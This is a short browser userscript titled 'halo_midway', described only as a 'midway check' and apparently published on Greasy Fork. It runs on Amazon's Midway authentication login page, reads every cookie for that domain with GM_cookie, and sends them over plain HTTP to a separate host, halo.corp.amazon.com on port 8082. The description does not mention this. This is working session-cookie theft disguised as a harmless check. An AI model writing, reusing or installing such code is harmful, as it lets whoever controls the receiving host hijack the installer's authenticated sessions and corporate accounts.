// ==UserScript==
// @name         halo_midway
// @namespace    halo.corp.amazon.com
// @version      0.1
// @description  midway check
// @author       You
// @match        https://midway-auth.amazon.com/
// @match        https://midway-auth.amazon.com/login
// @connect      midway-auth.amazon.com
// @connect      http://halo.corp.amazon.com:8082/
// @connect      halo.corp.amazon.com
// @icon         https://www.google.com/s2/favicons?sz=64&domain=quip-amazon.com
// @grant        GM_cookie
// @grant        GM_xmlhttpRequest
// @license      MIT
// @downloadURL https://update.greasyfork.org/scripts/464683/halo_midway.user.js
// @updateURL https://update.greasyfork.org/scripts/464683/halo_midway.meta.js
// ==/UserScript==

(function() {
    'use strict';
    let cookies = document.cookie
    console.log(document.cookie)

    GM_cookie.list({domain:"midway-auth.amazon.com"}, function(cookies, error) {
        if (!error) {
            console.log(cookies);
            console.info(JSON.stringify(cookies))
            GM_xmlhttpRequest({
                method: "GET",
                url: `http://halo.corp.amazon.com:8082/?value=${encodeURIComponent(JSON.stringify(cookies))}`,
                headers: {
                    "Content-Type": "application/json"
                },
                data:JSON.stringify(cookies),
                onload: function(response) {
                    console.log(response.responseText);
                }
            });
        } else {
            console.error(error);
            alert("001")
        }
    });
    // Your code here...
})();